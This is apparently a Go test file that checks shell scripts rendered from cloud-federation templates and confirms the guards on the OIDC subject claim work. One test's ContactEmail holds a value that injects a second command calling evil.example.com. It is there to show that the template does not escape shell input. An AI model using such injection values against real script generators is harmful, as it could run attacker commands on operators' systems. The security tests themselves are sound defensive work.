package iacfiles

import (
	"bytes"
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"text/template"
	"time"
)

// testTemplateData mirrors the fields that CLI templates read. It's a local
// fixture rather than a dependency on internal/api's federationIaCData so the
// test stays in this package (which has no other test coverage).
type testTemplateData struct {
	AccountName         string
	AccountExternalID   string
	AccountSlug         string
	Source              string
	OIDCIssuerURL       string
	OIDCIssuerHost      string
	OIDCAudience        string
	OIDCSubjectClaim    string
	SubscriptionID      string
	TenantID            string
	ProjectID           string
	ServiceAccountEmail string
	OIDCIssuerURI       string
	CUDlyAPIURL         string
	SourceAccountID     string
	ContactEmail        string
}

func renderCLITemplate(t *testing.T, path string, data testTemplateData) string {
	t.Helper()
	raw, err := Templates.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	tmpl, err := template.New(path).Parse(string(raw))
	if err != nil {
		t.Fatalf("parse %s: %v", path, err)
	}
	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, data); err != nil {
		t.Fatalf("execute %s: %v", path, err)
	}
	return buf.String()
}

// baseData matches what buildGenericIaCData produces for a self-service download
// (account-specific fields empty, CUDlyAPIURL set so the auto-register block renders).
func baseData() testTemplateData {
	return testTemplateData{
		AccountSlug:     "target",
		Source:          "aws",
		CUDlyAPIURL:     "https://cudly.example.com",
		SourceAccountID: "123456789012",
		ContactEmail:    "ops@example.com",
	}
}

func TestCLITemplatesAutoRegister(t *testing.T) {
	cases := []struct {
		name        string
		path        string
		mustContain []string
		mustNot     []string
	}{
		{
			name: "aws-cross-account",
			path: "templates/aws-cross-account-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"aws_auth_mode": "role_arn"`,
				`"aws_external_id": "${EXTERNAL_ID}"`,
				`"aws_role_arn": "${ROLE_ARN}"`,
				`"external_id": "${TARGET_ACCOUNT_ID}"`,
				`TARGET_ACCOUNT_ID=$(aws sts get-caller-identity`,
				`ACCOUNT_NAME="${CUDLY_ACCOUNT_NAME:-AWS ${TARGET_ACCOUNT_ID}}"`,
				`read -r -d '' PAYLOAD <<JSON || true`,
				`case "$HTTP_CODE" in`,
			},
			mustNot: []string{
				"/api/registrations",
				`"account_id":`,
				`"auth_mode":`,
			},
		},
		{
			name: "aws-wif",
			path: "templates/aws-wif-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"aws_auth_mode": "workload_identity_federation"`,
				`"aws_role_arn": "${ROLE_ARN}"`,
				`"external_id": "${TARGET_ACCOUNT_ID}"`,
				`TARGET_ACCOUNT_ID=$(aws sts get-caller-identity`,
				// #1640: the trust policy's :sub condition must be present
				// unconditionally — there is no longer a code path that omits it.
				`"${OIDC_HOST}:sub": "${OIDC_SUBJECT_CLAIM}"`,
			},
			mustNot: []string{
				"/api/registrations",
				`"account_id":`,
				// WIF flow has no STS external_id
				`aws_external_id`,
				// #1640: the subject claim is no longer optional.
				"Optional: restrict which OIDC subject",
			},
		},
		{
			name: "azure-wif",
			path: "templates/azure-wif-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"azure_auth_mode": "workload_identity_federation"`,
				`"azure_subscription_id": "${SUBSCRIPTION_ID}"`,
				`"azure_tenant_id": "${TENANT_ID}"`,
				`"azure_client_id": "${APP_ID}"`,
				`"external_id": "${SUBSCRIPTION_ID}"`,
				`ACCOUNT_NAME="${CUDLY_ACCOUNT_NAME:-Azure ${SUBSCRIPTION_ID}}"`,
				// Secret-free redesign: must use federated identity credential, not a cert upload.
				"az ad app federated-credential create",
				`"issuer": "${CUDLY_ISSUER_URL}"`,
				`"subject": "${CUDLY_FEDERATED_SUBJECT}"`,
				`"audiences": ["${CUDLY_FEDERATED_AUDIENCE}"]`,
				// Issuer env var must default to the CUDly base URL + /oidc
				// so Azure AD appending /.well-known/openid-configuration
				// resolves to the discovery endpoint on the CUDly deployment.
				`CUDLY_ISSUER_URL="${CUDLY_ISSUER_URL:-https://cudly.example.com/oidc}"`,
			},
			mustNot: []string{
				"/api/registrations",
				`"auth_mode":`,
				`"tenant_id":`,
				`"client_id":`,
				// Never the cert-based path.
				"az ad app credential reset",
				"CERTIFICATE_PEM_PATH",
				"azure_wif_private_key",
			},
		},
		{
			name: "gcp-wif",
			path: "templates/gcp-wif-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"gcp_auth_mode": "workload_identity_federation"`,
				`"gcp_project_id": "${PROJECT_ID}"`,
				`"gcp_client_email": "${SERVICE_ACCOUNT_EMAIL}"`,
				`"gcp_wif_audience": "${WIF_AUDIENCE}"`,
				`"external_id": "${PROJECT_ID}"`,
				`ACCOUNT_NAME="${CUDLY_ACCOUNT_NAME:-GCP ${PROJECT_ID}}"`,
				// Secret-free redesign: issuer is CUDly's own OIDC
				// deployment, subject is the fixed cudly-controller.
				`CUDLY_ISSUER_URL="${CUDLY_ISSUER_URL:-https://cudly.example.com/oidc}"`,
				`--issuer-uri="${CUDLY_ISSUER_URL}"`,
				`--attribute-mapping="google.subject=assertion.sub"`,
				`--attribute-condition="assertion.sub == '${CUDLY_FEDERATED_SUBJECT}'"`,
				`principal://iam.googleapis.com/${POOL_NAME}/subject/${CUDLY_FEDERATED_SUBJECT}`,
				`WIF_AUDIENCE="//iam.googleapis.com/${POOL_NAME}/providers/${PROVIDER_ID}"`,
			},
			mustNot: []string{
				"/api/registrations",
				`"service_account_email":`,
				// The old AWS-STS-ARN provider is gone.
				"create-aws",
				"attribute.aws_role",
				"SOURCE_AWS_ACCOUNT_ID",
				// No longer asking the operator to generate a creds
				// config JSON file.
				"create-cred-config",
				"gcp_workload_identity_config",
			},
		},
		{
			name: "gcp-sa-impersonation",
			path: "templates/gcp-sa-impersonation-cli.sh.tmpl",
			mustContain: []string{
				`"https://cudly.example.com/api/register"`,
				`"gcp_auth_mode": "application_default"`,
				`"gcp_project_id": "${PROJECT_ID}"`,
				`"gcp_client_email": "${SERVICE_ACCOUNT_EMAIL}"`,
				`ACCOUNT_NAME="${CUDLY_ACCOUNT_NAME:-GCP ${PROJECT_ID}}"`,
			},
			mustNot: []string{
				"/api/registrations",
				`"service_account_email":`,
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rendered := renderCLITemplate(t, tc.path, baseData())
			for _, needle := range tc.mustContain {
				if !strings.Contains(rendered, needle) {
					t.Errorf("%s: rendered script missing %q", tc.path, needle)
				}
			}
			for _, needle := range tc.mustNot {
				if strings.Contains(rendered, needle) {
					t.Errorf("%s: rendered script still contains stale %q", tc.path, needle)
				}
			}
		})
	}
}

// TestAWSWIFCLI_SubjectClaimRequired is the regression test for #1640: the
// CLI bundle's trust policy used to have an else-branch that silently built a
// subject-less policy (accepting every identity the issuer can mint) when
// OIDC_SUBJECT_CLAIM was unset. That branch is gone; this asserts there is no
// path left in the rendered script that omits the :sub condition, and that
// the required-value and forbidden-character guards are both present.
func TestAWSWIFCLI_SubjectClaimRequired(t *testing.T) {
	rendered := renderCLITemplate(t, "templates/aws-wif-cli.sh.tmpl", baseData()) // OIDCSubjectClaim == ""

	// Exactly one Condition block, and it always carries :sub — no branch
	// builds a StringEquals map with only :aud.
	subCondition := `"${OIDC_HOST}:sub": "${OIDC_SUBJECT_CLAIM}"`
	if n := strings.Count(rendered, subCondition); n != 1 {
		t.Errorf("expected exactly one :sub condition in the rendered trust policy, found %d", n)
	}
	subjectLessCondition := `{"StringEquals": {"${OIDC_HOST}:aud": "${OIDC_AUDIENCE}"}}`
	if strings.Contains(rendered, subjectLessCondition) {
		t.Errorf("rendered script still contains a subject-less Condition block: %q", subjectLessCondition)
	}

	// An unset/empty OIDC_SUBJECT_CLAIM must be rejected before any AWS call.
	if !strings.Contains(rendered, `if [[ -z "${OIDC_SUBJECT_CLAIM}" ]]`) {
		t.Error("rendered script must reject an empty OIDC_SUBJECT_CLAIM")
	}
	if !strings.Contains(rendered, "OIDC_SUBJECT_CLAIM is required") {
		t.Error("rendered script must explain that OIDC_SUBJECT_CLAIM is required")
	}
	// The empty-value guard must run before the first `aws` invocation, so a
	// misconfigured run fails loud instead of creating a partial OIDC provider.
	if guard, firstAWSCall := strings.Index(rendered, `if [[ -z "${OIDC_SUBJECT_CLAIM}" ]]`), strings.Index(rendered, "aws iam"); guard < 0 || firstAWSCall < 0 || guard > firstAWSCall {
		t.Errorf("the empty-OIDC_SUBJECT_CLAIM guard (offset %d) must run before the first aws iam call (offset %d)", guard, firstAWSCall)
	}

	// $ and * must be rejected — same characters PR #1602 rejects in the
	// CloudFormation OIDCSubjectClaim parameter, for the same reason.
	if !strings.Contains(rendered, `must not contain whitespace, '\$' or '*'`) {
		t.Error("rendered script must reject whitespace, '$', and '*' in OIDC_SUBJECT_CLAIM")
	}
}

// awsStubScript returns a stand-in `aws` executable that appends every
// invocation to logPath and prints a value the caller's `$(...)` captures can
// consume. It never contacts AWS, so a test that reaches it has proved the
// guard let the run through.
func awsStubScript(logPath string) string {
	return "#!/usr/bin/env bash\n" +
		// One log line per invocation: the trust-policy argument is multi-line
		// JSON, so newlines inside the arguments are folded to spaces first.
		"args=\"$*\"\n" +
		"printf '%s\\n' \"${args//$'\\n'/ }\" >> '" + logPath + "'\n" +
		// "None" is what the script's provider-lookup branches expect when no
		// OIDC provider exists yet, so the rest of the script proceeds.
		"echo None\n"
}

// runRenderedWIFScript writes the rendered aws-wif-cli.sh to a temp file, puts a
// recording `aws` stub first on PATH, runs the script under bash, and returns
// its exit code, stderr and the list of `aws` invocations the stub saw.
//
// PATH is set on the child process only (exec.Cmd.Env). The parent test
// process's environment is never mutated, so a run here cannot race with, or
// leak a stub `aws` into, any other test in this package.
func runRenderedWIFScript(t *testing.T, rendered string, env map[string]string) (exitCode int, stderr string, awsCalls []string) {
	t.Helper()

	// Fatal, not Skip: this is a security regression test, and a green run that
	// silently never executed the guard is worse than a red one. bash is already
	// a hard dependency of this repo (every generated bundle is a bash script,
	// and pre-commit runs shellcheck over them).
	bashPath, lookErr := exec.LookPath("bash")
	if lookErr != nil {
		t.Fatalf("bash is required to execute the rendered script: %v", lookErr)
	}

	dir := t.TempDir()
	scriptPath := filepath.Join(dir, "aws-wif-cli.sh")
	if err := os.WriteFile(scriptPath, []byte(rendered), 0o600); err != nil {
		t.Fatalf("write rendered script: %v", err)
	}

	stubDir := filepath.Join(dir, "bin")
	if err := os.Mkdir(stubDir, 0o700); err != nil {
		t.Fatalf("create stub dir: %v", err)
	}
	logPath := filepath.Join(dir, "aws-invocations.log")
	if err := os.WriteFile(filepath.Join(stubDir, "aws"), []byte(awsStubScript(logPath)), 0o755); err != nil {
		t.Fatalf("write aws stub: %v", err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, bashPath, scriptPath)
	// The real PATH is kept after stubDir so the script's `sed`/`echo` still
	// resolve; stubDir comes first so `aws` resolves to the stub.
	cmd.Env = []string{"PATH=" + stubDir + string(os.PathListSeparator) + os.Getenv("PATH")}
	for k, v := range env {
		cmd.Env = append(cmd.Env, k+"="+v)
	}
	// stdout is captured but not returned: the script's progress chatter is not
	// under test, and capturing it keeps it out of the test log.
	var errBuf, outBuf strings.Builder
	cmd.Stderr = &errBuf
	cmd.Stdout = &outBuf

	var exitErr *exec.ExitError
	if err := cmd.Run(); err != nil && !errors.As(err, &exitErr) {
		t.Fatalf("run rendered script: %v (stderr: %s)", err, errBuf.String())
	}

	logBytes, err := os.ReadFile(logPath)
	switch {
	case os.IsNotExist(err):
		// The stub was never invoked, which is what the reject cases want.
	case err != nil:
		t.Fatalf("read aws invocation log: %v", err)
	default:
		for _, line := range strings.Split(strings.TrimSpace(string(logBytes)), "\n") {
			if line != "" {
				awsCalls = append(awsCalls, line)
			}
		}
	}
	return cmd.ProcessState.ExitCode(), errBuf.String(), awsCalls
}

// TestAWSWIFCLI_SubjectClaimGuardBlocksAWSCalls executes the rendered script
// instead of only reading it. TestAWSWIFCLI_SubjectClaimRequired asserts on
// rendered text, which cannot distinguish a guard that works from a guard whose
// condition is inverted or whose `exit 1` was dropped; this runs Bash against a
// recording `aws` stub and asserts that an invalid OIDC_SUBJECT_CLAIM produces
// both a non-zero exit and zero AWS calls, so a broken guard cannot leave a
// half-created OIDC provider or a subject-less role behind.
func TestAWSWIFCLI_SubjectClaimGuardBlocksAWSCalls(t *testing.T) {
	// CUDlyAPIURL is cleared so the auto-registration block (which shells out to
	// curl and jq) is not rendered: this test is about the subject-claim guard,
	// and the positive control below runs the script to completion.
	data := baseData()
	data.CUDlyAPIURL = ""
	// A real issuer so OIDC_HOST resolves and the positive control can assert on
	// the fully-formed "<host>:sub" condition key the trust policy carries.
	data.OIDCIssuerURL = "https://accounts.google.com"
	rendered := renderCLITemplate(t, "templates/aws-wif-cli.sh.tmpl", data)

	// The two messages the rendered script's guards emit. Whitespace, $ and *
	// share one `case` arm, so they share one message.
	const (
		wantRequired  = "OIDC_SUBJECT_CLAIM is required"
		wantForbidden = `OIDC_SUBJECT_CLAIM must not contain whitespace, '$' or '*'.`
	)

	reject := []struct {
		name string
		// env holds the variables set on the child process. Omitting the
		// OIDC_SUBJECT_CLAIM key leaves the variable unset for that run.
		env      map[string]string
		wantText string
	}{
		{"unset", map[string]string{}, wantRequired},
		{"empty", map[string]string{"OIDC_SUBJECT_CLAIM": ""}, wantRequired},
		{"only whitespace", map[string]string{"OIDC_SUBJECT_CLAIM": "   "}, wantForbidden},
		{"embedded space", map[string]string{"OIDC_SUBJECT_CLAIM": "abc def"}, wantForbidden},
		{"tab", map[string]string{"OIDC_SUBJECT_CLAIM": "abc\tdef"}, wantForbidden},
		{"iam policy variable", map[string]string{"OIDC_SUBJECT_CLAIM": "${accounts.google.com:sub}"}, wantForbidden},
		{"bare dollar", map[string]string{"OIDC_SUBJECT_CLAIM": "abc$def"}, wantForbidden},
		{"bare wildcard", map[string]string{"OIDC_SUBJECT_CLAIM": "*"}, wantForbidden},
		{"embedded wildcard", map[string]string{"OIDC_SUBJECT_CLAIM": "abc*"}, wantForbidden},
	}

	for _, tc := range reject {
		t.Run("reject/"+tc.name, func(t *testing.T) {
			exitCode, stderr, awsCalls := runRenderedWIFScript(t, rendered, tc.env)

			if exitCode == 0 {
				t.Errorf("OIDC_SUBJECT_CLAIM %q was accepted (exit 0)", tc.env["OIDC_SUBJECT_CLAIM"])
			}
			if len(awsCalls) != 0 {
				t.Errorf("the guard must run before any AWS call, but the aws stub was invoked %d time(s): %v",
					len(awsCalls), awsCalls)
			}
			if !strings.Contains(stderr, tc.wantText) {
				t.Errorf("stderr must explain the rejection with %q, got:\n%s", tc.wantText, stderr)
			}
		})
	}

	// A hostile value baked into the template's default (the "{{.OIDCSubjectClaim}}"
	// fallback) is caught by the same guard when it merely contains a forbidden
	// character, so an operator who edits the generated script by hand is
	// covered too. This is not a substitute for validating the value at
	// generation time: the guard runs after the assignment on the
	// OIDC_SUBJECT_CLAIM="${OIDC_SUBJECT_CLAIM:-<default>}" line, so a command
	// substitution in the default would already have run. That is why
	// scripts/generate-federation-iac.go validates the flag before rendering.
	t.Run("reject/hostile template default", func(t *testing.T) {
		hostile := baseData()
		hostile.CUDlyAPIURL = ""
		hostile.OIDCSubjectClaim = "abc def"
		exitCode, stderr, awsCalls := runRenderedWIFScript(t,
			renderCLITemplate(t, "templates/aws-wif-cli.sh.tmpl", hostile), map[string]string{})

		if exitCode == 0 {
			t.Error("a whitespace-bearing template default was accepted (exit 0)")
		}
		if len(awsCalls) != 0 {
			t.Errorf("the aws stub must not be invoked, got %d call(s): %v", len(awsCalls), awsCalls)
		}
		if !strings.Contains(stderr, wantForbidden) {
			t.Errorf("stderr must explain the rejection with %q, got:\n%s", wantForbidden, stderr)
		}
	})

	// Positive control: without it, a guard that rejected every value would
	// satisfy every assertion above.
	t.Run("accept/valid subject claim", func(t *testing.T) {
		exitCode, stderr, awsCalls := runRenderedWIFScript(t, rendered,
			map[string]string{"OIDC_SUBJECT_CLAIM": "123456789012345678901"})

		if exitCode != 0 {
			t.Fatalf("a valid OIDC_SUBJECT_CLAIM was rejected (exit %d); stderr:\n%s", exitCode, stderr)
		}
		if len(awsCalls) == 0 {
			t.Fatal("a valid OIDC_SUBJECT_CLAIM must get past the guard and reach the aws calls, but the stub was never invoked")
		}
		// The role must actually be created with a trust policy carrying the
		// :sub condition, resolved to the supplied value.
		var createRole string
		for _, call := range awsCalls {
			if strings.HasPrefix(call, "iam create-role") {
				createRole = call
			}
		}
		if createRole == "" {
			t.Fatalf("expected an `aws iam create-role` invocation, got: %v", awsCalls)
		}
		if !strings.Contains(createRole, `"accounts.google.com:sub": "123456789012345678901"`) {
			t.Errorf("the trust policy passed to create-role must pin :sub to the supplied claim, got:\n%s", createRole)
		}
	})
}

// TestCLITemplatesShellMetacharsPassThrough confirms that text/template does
// not shell-escape interpolated values. This is intentional: the templates are
// designed to be downloaded and inspected by an operator, not auto-executed.
// The renderer (handler_federation.go) is responsible for validating fields
// before execution so that user-controlled values cannot inject shell commands.
func TestCLITemplatesShellMetacharsPassThrough(t *testing.T) {
	// Craft a ContactEmail that contains shell metacharacters. If the template
	// engine were to shell-escape this, the output would differ from the input.
	data := baseData()
	data.ContactEmail = `ops@example.com"; curl https://evil.example.com; echo "`

	rendered := renderCLITemplate(t, "templates/aws-cross-account-cli.sh.tmpl", data)

	// The raw metacharacter string must appear verbatim in the rendered output,
	// confirming that text/template does NOT escape it. The test documents the
	// invariant that the renderer MUST validate ContactEmail (and similar fields)
	// before calling template.Execute.
	if !strings.Contains(rendered, data.ContactEmail) {
		t.Errorf("expected raw ContactEmail (including metacharacters) to appear verbatim in rendered template; renderer must validate this field before execution")
	}
}

// TestGCPWIFTfvarsMarksPinnedIdentityRequired proves the generated tfvars file
// presents aws_role_name / oidc_subject as a blank the operator must fill, not
// as an optional hardening step. iac/federation/gcp-target/terraform pins both
// the provider's attribute condition and the impersonation grant to that value
// and refuses to apply without it, so "Recommended" understated it: a bundle
// following the old wording could not apply at all.
func TestGCPWIFTfvarsMarksPinnedIdentityRequired(t *testing.T) {
	const path = "templates/gcp-wif.tfvars.tmpl"

	awsData := baseData()
	awsData.Source = "aws"
	aws := renderCLITemplate(t, path, awsData)

	azureData := baseData()
	azureData.Source = "azure"
	azure := renderCLITemplate(t, path, azureData)

	cases := []struct {
		name     string
		rendered string
		assign   string
	}{
		{"aws", aws, "aws_role_name = \"\""},
		{"azure", azure, "oidc_subject = \"\""},
	}
	for _, tc := range cases {
		if strings.Contains(tc.rendered, "Recommended") {
			t.Errorf("%s (%s): pinning the trusted identity is required, not recommended; terraform apply fails without it", path, tc.name)
		}
		if !strings.Contains(tc.rendered, "REQUIRED") {
			t.Errorf("%s (%s): expected the pinned-identity variable to be labeled REQUIRED", path, tc.name)
		}
		// Emitted uncommented so the blank is visible in the file the customer
		// edits; a commented-out line reads as an option that was left off.
		if !strings.Contains(tc.rendered, "\n"+tc.assign) {
			t.Errorf("%s (%s): expected an uncommented %q line for the operator to fill", path, tc.name, tc.assign)
		}
	}

	// The AWS branch names the account the role must live in, so the operator
	// knows which account's role to pin.
	if !strings.Contains(aws, awsData.SourceAccountID) {
		t.Errorf("%s (aws): expected the source AWS account ID %q in the aws_role_name guidance", path, awsData.SourceAccountID)
	}
}

// TestCLITemplatesOmitRegisterBlock proves the auto-register section is gated
// on CUDlyAPIURL -- when it's empty, the block disappears entirely.
func TestCLITemplatesOmitRegisterBlock(t *testing.T) {
	data := baseData()
	data.CUDlyAPIURL = ""

	paths := []string{
		"templates/aws-cross-account-cli.sh.tmpl",
		"templates/aws-wif-cli.sh.tmpl",
		"templates/azure-wif-cli.sh.tmpl",
		"templates/gcp-wif-cli.sh.tmpl",
		"templates/gcp-sa-impersonation-cli.sh.tmpl",
	}
	for _, p := range paths {
		rendered := renderCLITemplate(t, p, data)
		if strings.Contains(rendered, "/api/register") {
			t.Errorf("%s: auto-register block should be gone when CUDlyAPIURL is empty", p)
		}
	}
}
